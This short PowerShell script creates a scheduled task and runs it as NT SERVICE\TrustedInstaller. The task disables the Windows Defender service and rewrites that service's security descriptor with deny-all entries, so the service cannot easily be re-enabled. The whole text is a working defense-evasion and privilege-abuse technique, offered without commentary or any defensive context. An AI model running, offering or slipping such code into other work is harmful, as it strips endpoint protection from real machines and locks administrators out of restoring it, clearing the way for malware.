$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'

$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
Register-ScheduledTask -TaskName 'TestTask' -Action $a

$svc = New-Object -ComObject 'Schedule.Service'
$svc.Connect()

$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('TestTask')
$task.RunEx($null, 0, 0, $user)
